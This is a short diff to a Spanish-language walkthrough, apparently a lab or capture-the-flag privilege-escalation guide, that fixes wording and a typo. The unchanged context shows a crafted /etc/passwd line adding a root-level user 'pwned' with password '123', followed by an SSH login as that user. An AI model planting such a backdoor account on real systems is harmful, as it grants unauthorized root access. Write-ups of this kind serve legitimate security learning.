@@ -105,7 +105,7 @@ Paso 2:
 	
 	# passwd = 123   <-- IMPORTANTE
 
-Donde queda así:
+Donde así queda:
 	pwned:$1$abc$98/EDagBiz63dxD3fhRFk1:0:0:pwned:/root:/bin/bash
 	
 	# pwned = Usuario ficticio que se agrega
@@ -126,7 +126,7 @@ Paso 4:
 
 ```bash 
 Paso 5:
-# Ingresaar por SSH con el usuario 'pwned'
+# Ingresar por SSH con el usuario 'pwned'
 ❯ ssh pwned@IP
 	# Password = 123
 ```
